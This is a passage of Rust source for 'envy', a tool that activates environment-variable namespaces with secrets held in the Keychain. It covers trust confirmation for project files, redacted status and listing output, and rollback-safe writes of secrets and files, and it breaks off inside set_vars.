//! envy's commands: `activate` and `status`, which return text for stdout,
//! and the interactive ones that change namespaces (`create`, `set_vars`,
//! `edit`, `remove`), with the write ordering they share ([`apply`]).

use std::collections::BTreeMap;
use std::io::Write;
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
use std::path::Path;

use anyhow::{Context, Result, bail};

use crate::activate::{read_value, read_values, render_transition};
use crate::config::{Config, NamespaceFile, SECRET_MARKER, Value};
use crate::display::quote_for_display;
use crate::levels::{Entry, Level, Levels, label};
use crate::link;
use crate::names::{validate_namespace, validate_var};
use crate::project::encode_path;
use crate::prompt::{Prompter, plain_label, secret_label, vet_plain};
use crate::secret::Secret;
use crate::stack::{
    ActiveState, Change as StackChange, Entry as StackEntry, Export, Warning, transition,
};
use crate::store::SecretStore;
use crate::trust::{Purpose, TrustStore, confirmation_text_for};

/// What `envy <ns>` produces: shell text for the wrapper's `eval`, which
/// contains secrets by design and may only be written to stdout, and notes
/// (collision warnings, variables that could not be restored) for stderr,
/// which name variables and namespaces only.
pub struct Activation {
    pub stdout: String,
    pub notes: Vec<String>,
}

/// Shows the notes only: `stdout` holds secret values.
impl std::fmt::Debug for Activation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Activation")
            .field("notes", &self.notes)
            .finish_non_exhaustive()
    }
}

/// Adds namespace `ns` (from `ctx.cfg`, one of `levels`) to the stack `prev`.
///
/// In order:
/// 1. load `ns`, and refuse a linked namespace that drifted from its group;
/// 2. at project level, unless this exact file at this checkout is already
///    trusted, show the confirmation ([`check_trust`]);
/// 3. ask, at a hidden prompt, for every secret the file lists that is not in
///    the Keychain (at either level);
/// 4. only then write: save the new secrets, record the trust;
/// 5. work out the change: `ns` goes on top, replacing any entry with its
///    name (from either level) and any linked alternative ([`linked_entries`]);
/// 6. read every value the change exports: this namespace's, and the ones a
///    replaced entry was shadowing ([`restore_values`], which never prompts);
/// 7. render.
///
/// A no, a failed prompt or no terminal leaves the Keychain, the trust
/// records and stdout untouched. A failed read in step 6 returns `Err`
/// before any output is built.
pub fn activate(ctx: &Ctx, levels: &Levels, ns: &str, prev: &ActiveState) -> Result<Activation> {
    let file = ctx.cfg.load(ns)?;
    link::ensure_aligned(ctx.cfg, &file)?;
    let must_record = check_trust(ctx, &file)?;

    let key = ctx.cfg.secret_key(ns);
    let display_ns = display_ns(ctx.cfg, ns);
    let mut secrets: Vec<(String, Secret)> = Vec::new();
    for (name, value) in file.vars() {
        // Existence only: no value is read before the render.
        if value != Value::Secret || ctx.store.contains(&key, &name)? {
            continue;
        }
        let secret = ctx
            .prompt
            .secret(&secret_label(&name, &display_ns))
            .with_context(|| {
                format!(
                    "secret {name} of namespace {ns} is not in the Keychain and was not entered \
                     (run envy {ns} in a terminal to enter it); nothing was changed"
                )
            })?;
        secrets.push((name, secret));
    }

    // Every prompt has returned: write.
    let undo = write_secrets(ctx, &key, &secrets)?;
    if must_record && let Err(e) = record_trust(ctx, &file) {
        return Err(rollback(ctx, &key, undo, e));
    }

    let here = label(ctx.cfg);
    let entry = StackEntry {
        namespace: ns.to_string(),
        source: Some(here.clone()),
        vars: file.vars().into_iter().map(|(name, _)| name).collect(),
    };
    let replaces = linked_entries(ctx.cfg, &here, &file, prev);
    let t = transition(prev, &StackChange::Add { entry, replaces })?;
    // Every value is read before any output is built, so a failure here
    // prints nothing. The new secrets and the trust record both stay: the
    // user entered and confirmed them, and a read failure does not roll
    // either back.
    let mut values = read_values(&file, ctx.store)?;
    let (restored, unrestored) = restore_values(
        levels,
        ctx.store,
        &t.next,
        &t.export,
        Some(ns),
        Restoring::Activation,
    )?;
    values.extend(restored);
    let mut notes: Vec<String> = t.warnings.iter().map(warning_text).collect();
    notes.extend(unrestored);
    Ok(Activation {
        stdout: render_transition(&t, &values),
        notes,
    })
}

/// Removes namespace `ns` from the stack `prev` (`envy --off <ns>`): unsets
/// the variables only it defined and restores those it was shadowing from
/// the next namespace that defines them ([`restore_values`]: re-read, trust
/// checked, never prompting). `ns` is not active: an `Err` naming it, and
/// nothing changes. Every value is read before any output is built.
pub fn deactivate(
    store: &dyn SecretStore,
    levels: &Levels,
    ns: &str,
    prev: &ActiveState,
) -> Result<Activation> {
    let t = transition(
        prev,
        &StackChange::Remove {
            namespace: ns.to_string(),
        },
    )?;
    let (values, notes) =
        restore_values(levels, store, &t.next, &t.export, None, Restoring::Removal)?;
    Ok(Activation {
        stdout: render_transition(&t, &values),
        notes,
    })
}

/// The entries of `prev` that `file` replaces as linked alternatives: those
/// recorded from this level (`here`, its label) whose file here is in the same
/// link group. Entries from other levels are never re-read, so never linked;
/// an entry whose file cannot be loaded is not linked either. The entry with
/// `file`'s own name is replaced anyway ([`transition`]).
fn linked_entries(
    cfg: &Config,
    here: &str,
    file: &NamespaceFile,
    prev: &ActiveState,
) -> Vec<String> {
    let Some(group) = file.link() else {
        return Vec::new();
    };
    let mut linked: Vec<String> = Vec::new();
    for e in &prev.entries {
        if e.namespace == file.name()
            || e.source.as_deref() != Some(here)
            || linked.contains(&e.namespace)
        {
            continue;
        }
        if cfg
            .load(&e.namespace)
            .is_ok_and(|f| f.link() == Some(group))
        {
            linked.push(e.namespace.clone());
        }
    }
    linked
}

/// The stderr line for a warning. Names only, never a value.
fn warning_text(warning: &Warning) -> String {
    match warning {
        Warning::Collision {
            var,
            winner,
            shadowed,
        } => format!(
            "warning: {var} is set by both {shadowed:?} and {winner:?}; {winner:?} wins (it was activated last)"
        ),
    }
}

/// Why variables are being restored: it only changes the wording of the notes
/// that tell the user how to get an unrestored variable back.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Restoring {
    /// Activating a namespace replaced an entry that shadowed them.
    Activation,
    /// `envy --off <name>` removed the entry that shadowed them.
    Removal,
}

/// The values of `exports` (each owned, in `state`, by the namespace it
/// names), except those of namespace `skip`, whose values the caller reads
/// itself. Each owner is re-read from the level its entry records, found
/// through [`Levels::config_for`]; nothing ever prompts. A variable is left
/// out (and so left unset) with a note when its owner's level is unknown or
/// not visible from here, its project file is not trusted as it is now
/// ([`TrustStore::is_trusted`]: it is then not read at all), its file cannot
/// be loaded or no longer defines it, or its secret is not in the store.
/// A failed store read is an error.
///
/// Returns the values and the notes for stderr: one line per reason, naming
/// the variables, the namespace and, for a level not visible from here, its
/// folder. Never a value.
pub fn restore_values(
    levels: &Levels,
    store: &dyn SecretStore,
    state: &ActiveState,
    exports: &[Export],
    skip: Option<&str>,
    why: Restoring,
) -> Result<(BTreeMap<String, String>, Vec<String>)> {
    let mut values = BTreeMap::new();
    // Per reason, the variables it leaves unset, in order.
    let mut unset: Vec<(String, Vec<String>)> = Vec::new();
    for export in exports {
        if skip == Some(export.from.as_str()) {
            continue;
        }
        match restore_one(levels, store, state, export, why)? {
            Ok(text) => {
                values.insert(export.var.clone(), text);
            }
            Err(reason) => match unset.iter_mut().find(|(r, _)| *r == reason) {
                Some((_, vars)) => vars.push(export.var.clone()),
                None => unset.push((reason, vec![export.var.clone()])),
            },
        }
    }
    let notes = unset
        .into_iter()
        .map(|(reason, vars)| format!("note: left unset: {} ({reason})", vars.join(", ")))
        .collect();
    Ok((values, notes))
}

/// The value of one export ([`restore_values`]): `Ok(Ok(value))`, or
/// `Ok(Err(reason))` when it cannot be restored.
fn restore_one(
    levels: &Levels,
    store: &dyn SecretStore,
    state: &ActiveState,
    export: &Export,
    why: Restoring,
) -> Result<std::result::Result<String, String>> {
    let ns = export.from.as_str();
    let var = export.var.as_str();
    // The exact entry that wins the variable: a tampered state may hold the
    // name more than once. Callers pass the state the exports were computed
    // from, so its winner is always the export's owner.
    let owner = state.winner(var).filter(|e| e.namespace == ns);
    debug_assert!(owner.is_some(), "export of {var} does not match the state");
    let Some(owner) = owner else {
        return Ok(Err(format!(
            "internal error: {var} is not owned by namespace {ns:?} in the active state"
        )));
    };
    let Some(source) = owner.source.as_deref() else {
        let how = match why {
            Restoring::Activation => format!("run envy {ns} to load it again"),
            Restoring::Removal => "run envy --off to remove everything".to_string(),
        };
        return Ok(Err(format!(
            "namespace {ns:?} was loaded by an older envy, so its level is unknown; {how}"
        )));
    };
    let Some(cfg) = levels.config_for(source) else {
        let how = match why {
            Restoring::Activation => format!("run envy {ns} in that project to load it again"),
            Restoring::Removal => {
                format!("run envy --off {ns} from that project's folder to remove it")
            }
        };
        return Ok(Err(format!(
            "namespace {ns:?} was loaded from {source}, which is not visible from this folder; {how}"
        )));
    };
    let Ok(file) = cfg.load(ns) else {
        return Ok(Err(format!(
            "namespace {ns:?} cannot be read; run envy {ns} to see why"
        )));
    };
    if let Some(root) = cfg.root() {
        let trust = TrustStore::new(cfg.user_dir());
        if !trust.is_trusted(root, ns, &file.text())? {
            let why = if trust.previously_trusted(root, ns)? {
                "has changed since you confirmed it"
            } else {
                "is not confirmed"
            };
            return Ok(Err(format!(
                "project namespace {ns:?} in {source} {why}; run envy {ns} there to review it"
            )));
        }
    }
    let Some(value) = file.get(var) else {
        return Ok(Err(format!("namespace {ns:?} no longer defines them")));
    };
    Ok(read_value(&file, var, &value, store)
        .with_context(|| format!("cannot restore {var} from namespace {ns}"))?
        .ok_or_else(|| {
            format!(
                "not in the Keychain for namespace {ns:?}; run envy {ns} to enter missing secrets"
            )
        }))
}

/// [`activate`] at `ctx.cfg` alone (plus the user level), for the tests
/// written before stacking: the stdout text.
#[cfg(test)]
pub(crate) fn activate_here(ctx: &Ctx, ns: &str, prev: &ActiveState) -> Result<String> {
    let user = Config::new(ctx.cfg.user_dir().to_path_buf());
    let levels = if ctx.cfg.is_project() {
        Levels::with_projects(vec![ctx.cfg.clone()], user)
    } else {
        Levels::user_only(ctx.cfg.clone())
    };
    activate(ctx, &levels, ns, prev).map(|a| a.stdout)
}

/// How prompts name a namespace: with its project at project level, so the
/// user can tell which Keychain key they are typing into.
pub(crate) fn display_ns(cfg: &Config, ns: &str) -> String {
    match cfg.identity() {
        Some(identity) => format!("{ns} (project {identity})"),
        None => ns.to_string(),
    }
}

/// Asks before a project namespace is used, unless this exact file at this
/// checkout is already trusted. Returns `Ok(true)` when the user said yes and
/// the caller must [`record_trust`] once its own writes have succeeded;
/// `Ok(false)` when there is nothing to record (user level, or already
/// trusted). A no, or no terminal to ask on, is an `Err`. The question names
/// variables and which secrets are already in the Keychain, never a value.
pub(crate) fn check_trust(ctx: &Ctx, file: &NamespaceFile) -> Result<bool> {
    check_trust_for(ctx, file, Purpose::Load)
}

/// [`check_trust`] with the consent text describing `purpose`.
pub(crate) fn check_trust_for(ctx: &Ctx, file: &NamespaceFile, purpose: Purpose) -> Result<bool> {
    let Some(root) = ctx.cfg.root() else {
        // The user's own namespace: never asked about.
        return Ok(false);
    };
    let ns = file.name();
    let trust = TrustStore::new(ctx.cfg.user_dir());
    let text = file.text();
    if trust.is_trusted(root, ns, &text)? {
        return Ok(false);
    }
    let key = ctx.cfg.secret_key(ns);
    let mut in_keychain: Vec<String> = Vec::new();
    for (name, value) in file.vars() {
        // Existence only, before the user has agreed to anything: no value
        // is read (on the real Keychain, no access dialog).
        if value == Value::Secret && ctx.store.contains(&key, &name)? {
            in_keychain.push(name);
        }
    }
    let mut question = String::new();
    let seen_here = trust.previously_trusted(root, ns)?;
    if seen_here {
        question.push_str("Note: this namespace file has changed since you last trusted it.\n\n");
    }
    question.push_str(&confirmation_text_for(
        ctx.cfg,
        file,
        &in_keychain,
        purpose,
        !seen_here,
    ));
    let (hint, nothing) = match purpose {
        Purpose::Load => (
            format!("run envy {ns} in a terminal"),
            "nothing was changed",
        ),
        Purpose::Copy => (
            "run the command again in a terminal".to_string(),
            "nothing was copied",
        ),
        Purpose::Change => (
            "run the command again in a terminal to review the namespace first".to_string(),
            "nothing was changed",
        ),
    };
    let yes = ctx.prompt.confirm(&question).with_context(|| {
        format!(
            "project namespace {ns:?} is not trusted yet and needs a terminal to review it \
             ({hint}); {nothing}"
        )
    })?;
    if !yes {
        let not = match purpose {
            Purpose::Load => "not loaded",
            Purpose::Copy => "not copied",
            Purpose::Change => "not changed",
        };
        bail!("{not}: you did not trust namespace {ns:?}; {nothing}");
    }
    Ok(true)
}

/// Asks before a project namespace is changed, unless its current contents
/// are already trusted ([`check_trust_for`] with [`Purpose::Change`]). Called
/// on the same in-memory file the command then changes, before any other
/// question, any editor and any write; the caller then records the file it
/// wrote with [`record_trust_after_change`]. A `git pull` that slipped a line
/// into the file is thus shown, never trusted just because the user ran an
/// envy command on it.
pub(crate) fn check_trust_for_change(ctx: &Ctx, file: &NamespaceFile) -> Result<()> {
    check_trust_for(ctx, file, Purpose::Change).map(|_| ())
}

/// Records `file`, the namespace the user just changed, as trusted: always,
/// even when it was trusted before the change, so the user's own change is
/// not asked about at the next load. Only that namespace: other members of
/// its link group rewritten along with it are not recorded (their plain
/// values were never shown), and are confirmed at their first load. A no-op
/// at user level.
pub(crate) fn record_trust_after_change(ctx: &Ctx, file: &NamespaceFile) -> Result<()> {
    record_trust(ctx, file).with_context(|| {
        format!(
            "namespace {:?} was changed, but its trust could not be recorded; \
             it will be confirmed at its next load",
            file.name()
        )
    })
}

/// Records that the user trusts `file` as it is now, at this checkout. Does
/// nothing at user level.
pub(crate) fn record_trust(ctx: &Ctx, file: &NamespaceFile) -> Result<()> {
    match ctx.cfg.root() {
        Some(root) => TrustStore::new(ctx.cfg.user_dir()).record(root, file.name(), &file.text()),
        None => Ok(()),
    }
}

/// Lists namespace names, one per line, `* ` marking the active one. Names
/// only: never values, secret or plain.
///
/// Outside any project this is the user level's names alone. With project
/// levels, each level gets a block, nearest project first and the user level
/// last, introduced by `project: <its .envy folder>` (percent-encoded, as the
/// path is the repository's to choose) or `user:`. A name that a nearer level
/// already provides is marked ` (shadowed)`. The `*` marks the row that was
/// loaded ([`is_active`]); when no row is that one, a last line says the
/// active namespace no longer exists or was loaded from another folder.
pub fn status(levels: &Levels, active: &ActiveState) -> Result<String> {
    let entries = levels.entries()?;
    let level_label = |level: &Level| match level {
        Level::User => "user".to_string(),
        Level::Project { dir } => encode_path(dir),
    };
    let count = |name: &str| entries.iter().filter(|e| e.name == name).count();
    let starred = |e: &Entry| {
        is_active(active, &e.name, &level_label(&e.level), e.shadowed, || {
            Ok(count(&e.name))
        })
        .unwrap_or(false)
    };
    let row = |e: &Entry| {
        let marker = if starred(e) { "*" } else { " " };
        let shadowed = if e.shadowed { " (shadowed)" } else { "" };
        format!("{marker} {}{shadowed}\n", e.name)
    };
    let block = |level: &Level| {
        let rows: String = entries
            .iter()
            .filter(|e| &e.level == level)
            .map(row)
            .collect();
        if rows.is_empty() {
            "  (no namespaces)\n".to_string()
        } else {
            rows
        }
    };
    let mut out = String::new();
    if levels.projects().is_empty() {
        out.extend(entries.iter().map(row));
    } else if !entries.is_empty() {
        for project in levels.projects() {
            out.push_str(&format!("project: {}\n", label(project)));
            out.push_str(&block(&Level::Project {
                dir: project.dir().to_path_buf(),
            }));
        }
        out.push_str("user:\n");
        out.push_str(&block(&Level::User));
    }
    if let Some(current) = active.entries.last()
        && !entries
            .iter()
            .any(|e| e.name == current.namespace && starred(e))
    {
        let ns = current.namespace.as_str();
        // An old shell (no source) with an ambiguous name marks nothing and
        // adds nothing: the name does exist.
        let ambiguous = current.source.is_none() && count(ns) > 1;
        let elsewhere = match current.source.as_deref() {
            None | Some("user") => false,
            Some(src) => !levels.projects().iter().any(|p| label(p) == src),
        };
        if elsewhere {
            out.push_str(&format!("* {ns} (from another folder)\n"));
        } else if !ambiguous {
            out.push_str(&format!("* {ns} (no longer exists)\n"));
        }
    }
    if out.is_empty() {
        out.push_str("no namespaces yet; create one with: envy <name> --new\n");
    }
    Ok(out)
}

/// Whether namespace `name` at the level labelled `level` is the one the
/// shell loaded. With `ENVY_SOURCE`, the name and the level must both match.
/// A shell from before it existed records no level: then the unshadowed row
/// of the name counts, but only if just one level has the name (`count`),
/// since which one was loaded is unknown.
fn is_active(
    active: &ActiveState,
    name: &str,
    level: &str,
    shadowed: bool,
    count: impl FnOnce() -> Result<usize>,
) -> Result<bool> {
    let Some(current) = active.entries.last().filter(|e| e.namespace == name) else {
        return Ok(false);
    };
    Ok(match current.source.as_deref() {
        Some(source) => source == level,
        None => !shadowed && count()? <= 1,
    })
}

/// Shows the variables of namespace `ns`, resolved as `envy <ns>` would
/// resolve it (`force_user` is `--user`): where it comes from, its link
/// group, and per variable the name and its value: a plain value quoted and
/// escaped, a secret as the bare marker `@keychain` (never its value). Reads
/// only the namespace file: it takes no `SecretStore`, so a secret value can
/// never be fetched, let alone printed. Plain values are quoted and escaped
/// ([`quote_for_display`]) so they cannot disturb the terminal or the layout;
/// a project file's path is percent-encoded for the same reason. `(active)`
/// only when this level's `ns` is the one loaded ([`is_active`]).
pub fn list_vars(
    levels: &Levels,
    ns: &str,
    force_user: bool,
    active: &ActiveState,
) -> Result<String> {
    let cfg = levels.resolve(ns, force_user)?.cfg;
    let file = cfg.load(ns)?;
    let mut out = format!("namespace: {ns}");
    if is_active(active, ns, &label(cfg), false, || levels.count(ns))? {
        out.push_str(" (active)");
    }
    out.push('\n');
    if cfg.is_project() {
        let path = encode_path(&cfg.dir().join(format!("{ns}.toml")));
        out.push_str(&format!("source: project ({path})\n"));
    } else {
        out.push_str("source: user\n");
    }
    if let Some(group) = file.link() {
        out.push_str(&format!("link: {group}\n"));
    }
    out.push('\n');
    let vars = file.vars();
    if vars.is_empty() {
        out.push_str("(no variables)\n");
        return Ok(out);
    }
    out.push_str(&render_var_rows(&vars));
    Ok(out)
}

/// One `NAME  value` row per variable, names padded to the longest, plain
/// values quoted and escaped, secrets as the bare marker. Shared by `--list`
/// and the first-load confirmation so both show a variable the same way.
pub(crate) fn render_var_rows(vars: &[(String, Value)]) -> String {
    let width = vars
        .iter()
        .map(|(n, _)| n.chars().count())
        .max()
        .unwrap_or(0);
    let mut out = String::new();
    for (name, value) in vars {
        let shown = match value {
            Value::Secret => SECRET_MARKER.to_string(),
            Value::Plain(v) => quote_for_display(v),
        };
        out.push_str(&format!("{name:<width$}  {shown}\n"));
    }
    out
}

/// Everything the interactive commands need. Tests build one from a temp
/// `Config`, a `MemoryStore` and a `ScriptedPrompter`.
pub struct Ctx<'a> {
    pub cfg: &'a Config,
    pub store: &'a dyn SecretStore,
    pub prompt: &'a dyn Prompter,
}

/// What a Keychain item held before we overwrote it, so a failed command can
/// put it back.
struct Undo {
    name: String,
    prior: Option<Secret>,
}

/// Per written namespace: its name, its secret key and what it replaced.
type Written = Vec<(String, String, Vec<Undo>)>;

/// Writes the secrets to the Keychain, remembering what they replaced. If a
/// write fails, the ones already written are rolled back before returning.
fn write_secrets(ctx: &Ctx, key: &str, items: &[(String, Secret)]) -> Result<Vec<Undo>> {
    let mut undo: Vec<Undo> = Vec::new();
    for (name, secret) in items {
        let step = ctx
            .store
            .get(key, name)
            .and_then(|prior| ctx.store.set(key, name, secret).map(|()| prior));
        match step {
            Ok(prior) => undo.push(Undo {
                name: name.clone(),
                prior,
            }),
            Err(e) => return Err(rollback(ctx, key, undo, e)),
        }
    }
    Ok(undo)
}

/// Restores the Keychain to what it was before `write_secrets`: items that did
/// not exist are deleted, items that did are put back. Returns `cause`, with a
/// note if the rollback itself could not finish.
fn rollback(ctx: &Ctx, key: &str, undo: Vec<Undo>, cause: anyhow::Error) -> anyhow::Error {
    let mut stuck: Vec<String> = Vec::new();
    for u in undo.into_iter().rev() {
        let result = match &u.prior {
            Some(prior) => ctx.store.set(key, &u.name, prior),
            None => ctx.store.delete(key, &u.name),
        };
        if result.is_err() {
            stuck.push(u.name);
        }
    }
    if stuck.is_empty() {
        cause
    } else {
        cause.context(format!(
            "could not undo the Keychain changes for: {}",
            stuck.join(", ")
        ))
    }
}

/// One namespace file written as part of a command, possibly alongside other
/// members of its link group.
pub(crate) struct Change {
    /// The new contents.
    pub file: NamespaceFile,
    /// What is on disk now (`None`: the file is being created).
    pub before: Option<NamespaceFile>,
    /// Keychain items to write before the file is saved.
    pub secrets: Vec<(String, Secret)>,
    /// Keychain items to delete once every file is saved (names the new file
    /// no longer has as secrets).
    pub delete: Vec<String>,
}

/// Writes a set of changes with no transaction to lean on, in the order that
/// keeps every intermediate state safe:
///
/// 1. Every new Keychain item, for every namespace. A failure restores the
///    items already written (prior values put back, new ones deleted).
/// 2. Every file, in order. A failure puts back the files already saved,
///    then the Keychain items. A file that cannot be put back keeps its new
///    contents, and so do its Keychain items, so no file ever refers to a
///    secret that is not in the Keychain.
/// 3. The Keychain items no file refers to any more. A failure here leaves
///    only unreferenced items behind, and says which.
pub(crate) fn apply(ctx: &Ctx, changes: Vec<Change>) -> Result<()> {
    let mut written: Written = Vec::new();
    for c in &changes {
        let key = ctx.cfg.secret_key(c.file.name());
        match write_secrets(ctx, &key, &c.secrets) {
            Ok(undo) => written.push((c.file.name().to_string(), key, undo)),
            Err(e) => return Err(rollback_all(ctx, written, &[], e)),
        }
    }
    for (i, c) in changes.iter().enumerate() {
        if let Err(e) = ctx.cfg.save(&c.file) {
            let (kept, e) = restore_files(ctx, &changes[..i], e);
            return Err(rollback_all(ctx, written, &kept, e));
        }
    }
    let mut stuck: Vec<String> = Vec::new();
    for c in &changes {
        let key = ctx.cfg.secret_key(c.file.name());
        for name in &c.delete {
            if ctx.store.delete(&key, name).is_err() {
                stuck.push(format!("{}/{name}", c.file.name()));
            }
        }
    }
    if !stuck.is_empty() {
        bail!(
            "the changes were saved, but these old Keychain items could not be deleted: {}",
            stuck.join(", ")
        );
    }
    Ok(())
}

/// Undoes the Keychain writes of every namespace except those in `keep`
/// (whose files could not be restored and still refer to the new items).
fn rollback_all(
    ctx: &Ctx,
    written: Written,
    keep: &[String],
    cause: anyhow::Error,
) -> anyhow::Error {
    let mut err = cause;
    for (ns, key, undo) in written.into_iter().rev() {
        if !keep.contains(&ns) {
            err = rollback(ctx, &key, undo, err);
        }
    }
    err
}

/// Puts back the files of `saved`. Returns the namespaces that could not be
/// put back, with `cause` noting them.
fn restore_files(
    ctx: &Ctx,
    saved: &[Change],
    cause: anyhow::Error,
) -> (Vec<String>, anyhow::Error) {
    let mut kept: Vec<String> = Vec::new();
    for c in saved.iter().rev() {
        let name = c.file.name();
        let result = match &c.before {
            Some(before) => ctx.cfg.save(before),
            None => ctx.cfg.delete(name),
        };
        if result.is_err() {
            kept.push(name.to_string());
        }
    }
    if kept.is_empty() {
        (kept, cause)
    } else {
        let note = format!(
            "could not restore these namespaces, which keep their new contents and secrets: {}",
            kept.join(", ")
        );
        (kept, cause.context(note))
    }
}

/// Creates namespace `ns` in `ctx.cfg`'s level, empty or modelled on `like`
/// (an already-resolved source file, possibly from another level: names and
/// plain values are copied; each secret is prompted for under the new
/// namespace's key; the `link` label is not copied), and with `link` joins
/// it to that link group. A `like` that is the very namespace being created
/// at this level fails as "already exists". At project level the new file is
/// recorded as trusted: the user just wrote it.
///
/// `like`'s `Config` must be the one its file was loaded from (the file's
/// secret key is checked against it): it decides whether the source is a
/// project file to confirm, and against which checkout.
///
/// Order: validate; check that the source pair matches; if the source is an
/// unconfirmed project file, show its confirmation ([`Purpose::Copy`]); check
/// that the namespace can join the group; prompt for everything; re-check
/// that `ns` still does not exist; then [`apply`] and record the new file as
/// trusted. A failure at any step leaves nothing behind.
pub fn create(
    ctx: &Ctx,
    ns: &str,
    like: Option<(&Config, &NamespaceFile)>,
    link: Option<&str>,
) -> Result<()> {
    validate_namespace(ns)?;
    if let Some(group) = link {
        validate_namespace(group)?;
    }
    let taken = |ctx: &Ctx| {
        if ctx.cfg.is_project() {
            ctx.cfg.present(ns)
        } else {
            ctx.cfg.exists(ns)
        }
    };
    if taken(ctx)? {
        bail!("namespace {ns:?} already exists");
    }
    // A user-level `Config` paired with a project file would skip the
    // confirmation below; a different project's would check the wrong
    // checkout. Both fail closed.
    if let Some((source_cfg, source)) = like {
        anyhow::ensure!(
            source.secret_key() == source_cfg.secret_key(source.name()),
            "internal error: --like namespace {:?} was not loaded from the given config; \
             nothing was created",
            source.name()
        );
    }
    // Copying is not loading, but it moves a project file's variables into a
    // namespace that is then trusted (or, at user level, never asked about):
    // an unconfirmed project source must be confirmed first, against its own
    // level. The source is not recorded as trusted: the user agreed to a
    // copy, and it is still confirmed at its first load.
    if let Some((source_cfg, source)) = like
        && source_cfg.is_project()
    {
        let source_ctx = Ctx {
            cfg: source_cfg,
            store: ctx.store,
            prompt: ctx.prompt,
        };
        check_trust_for(&source_ctx, source, Purpose::Copy)?;
    }
    let mut file = NamespaceFile::empty(ns)?;
    let mut like_secrets: Vec<String> = Vec::new();
    if let Some((_, source)) = like {
        for (name, value) in source.vars() {
            if value == Value::Secret {
                like_secrets.push(name.clone());
            }
            file.set_var(&name, value)?;
        }
    }
    let missing = match link {
        Some(group) => link::check_join(ctx.cfg, &file, group)?,
        None => Vec::new(),
    };
    let mut secrets: Vec<(String, Secret)> = Vec::new();
    for name in like_secrets {
        let secret = ctx
            .prompt
            .secret(&secret_label(&name, &display_ns(ctx.cfg, ns)))
            .with_context(|| format!("no value for secret {name}; nothing was created"))?;
        secrets.push((name, secret));
    }
    if let Some(group) = link {
        link::fill_missing(ctx, &mut file, &missing, &mut secrets)?;
        file.set_link(Some(group))?;
    }
    // The prompts can take a while: do not replace a namespace created
    // meanwhile (or write over its Keychain items).
    if taken(ctx)? {
        bail!(
            "namespace {ns:?} was created by something else while envy was prompting; nothing was changed"
        );
    }
    // `save` writes exactly `file.text()`, so that is what gets recorded.
    let saved = file.clone();
    apply(
        ctx,
        vec![Change {
            file,
            before: None,
            secrets,
            delete: Vec::new(),
        }],
    )?;
    // The user just wrote this file, so it needs no confirmation later. If
    // recording fails the file already exists; the error is returned and the
    // file is simply confirmed at its first load. A no-op at user level.
    record_trust(ctx, &saved).with_context(|| {
        format!(
            "namespace {ns:?} was created, but its trust could not be recorded; \
             it will be confirmed at first load"
        )
    })
}

/// How one variable of `--secret` or `--plain` is set. Never holds a secret
/// value: secrets are always prompted for, so deriving `Debug` is safe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SetKind {
    /// `--secret NAME`: a hidden prompt; the value goes to the Keychain.
    Secret,
    /// `--plain NAME=value` (`Some`, used as given, no prompt) or
    /// `--plain NAME` (`None`, a visible prompt); the value goes in the file.
    Plain(Option<String>),
}

/// One variable to set, as given on the command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SetItem {
    pub name: String,
    pub kind: SetKind,
}

impl SetItem {
    pub fn secret(name: &str) -> Self {
        Self {
            name: name.to_string(),
            kind: SetKind::Secret,
        }
    }

    pub fn plain(name: &str, value: Option<&str>) -> Self {
        Self {
            name: name.to_string(),
            kind: SetKind::Plain(value.map(str::to_string)),
        }
    }
}

/// Sets every variable of `items` in namespace `ns`, in one write: secrets
/// (hidden prompt, value in the Keychain, only the marker in the file) and
/// plain values (given inline, or prompted for visibly with the current value
/// as the default, and stored in the file). Changing the kind of an existing
/// variable asks first. In a linked namespace the rest of the group is then
/// made to match `ns`, for every item at once (see [`link::conform`]).
///
/// Names (and inline values) are all checked first. At project level the
/// file's current contents must then be trusted, or confirmed
/// ([`check_trust_for_change`]). Then everything, for every item and every
/// member, is asked in the order given, before anything is written; then,
/// unless `ns` or its group changed meanwhile ([`link::ensure_unchanged`]),
/// the writes go through a single [`apply`], and the new `ns` (only) is
/// recorded as trusted.
pub fn set_vars(ctx: &Ctx, ns: &str, items: &[SetItem]) -> Result<()> {
    validate_namespace(ns)?;
    if items.is_empty() {
        bail!("no variables given; nothing was changed");
    }
    let mut seen: Vec<&str> = Vec::new();
    for item in items {
        let name = item.name.as_str();
        validate_var(name)?;
        if seen.contains(&name) {
            bail!("variable {name} is given more than once; nothing was changed");
        }
        seen.push(name);
        if let SetKind::Plain(Some(value)) = &item.kind {
            check_inline_plain(name, value)?;
        }
    }
    let before = ctx.cfg.load(ns)?;
    // Loaded before prompting, so an unreadable member stops us early.
    let others = link::others(ctx.cfg, &before)?;
    check_trust_for_change(ctx, &before)?;
    let shown = display_ns(ctx.cfg, ns);
    let mut file = before.clone();
    let mut secrets: Vec<(String, Secret)> = Vec::new();
    let mut delete: Vec<String> = Vec::new();

    for item in items {
        let name = item.name.as_str();
        let current = before.get(name);
        match &item.kind {
            SetKind::Plain(given) => {
                if current == Some(Value::Secret)
                    && !ctx.prompt.confirm(&format!(
                        "{name} is currently a secret. Replace it with a plain value (the Keychain item will be deleted)?"
                    ))?
                {
                    bail!("cancelled; nothing was changed");
                }
                let value = match given {
                    Some(value) => value.clone(),
                    None => {
                        let default = match &current {
                            Some(Value::Plain(v)) => Some(v.as_str()),
                            _ => None,
                        };
                        ctx.prompt
                            .plain(&plain_label(name, &shown), default)
                            .with_context(|| format!("no value for {name}; nothing was changed"))?
                    }
                };
                // Rejects the reserved marker before anything is written.
                file.set_var(name, Value::Plain(value))?;
                if current == Some(Value::Secret) {
                    delete.push(name.to_string());
                }
            }
            SetKind::Secret => {
                if matches!(current, Some(Value::Plain(_)))
                    && !ctx.prompt.confirm(&format!(
                        "{name} is currently a plain value. Replace it with a secret?"
                    ))?
                {
                    bail!("cancelled; nothing was changed");
                }
                let secret = ctx
                    .prompt
                    .secret(&secret_label(name, &shown))
                    .with_context(|| format!("no value for secret {name}; nothing was changed"))?;
                file.set_var(name, Value::Secret)?;
                secrets.push((name.to_string(), secret));
            }
        }
    }

    let group = link::conform(ctx, &file, others.clone())?;
    // The prompts can take a while: do not overwrite a change made meanwhile
    // (to `ns` or to its group).
    link::ensure_unchanged(ctx.cfg, &before, before.link(), &others)?;
    // `save` writes exactly `file.text()`, so that is what gets recorded.
    let saved = file.clone();
    let mut changes = vec![Change {
        file,
        before: Some(before),
        secrets,
        delete,
    }];
    changes.extend(group);
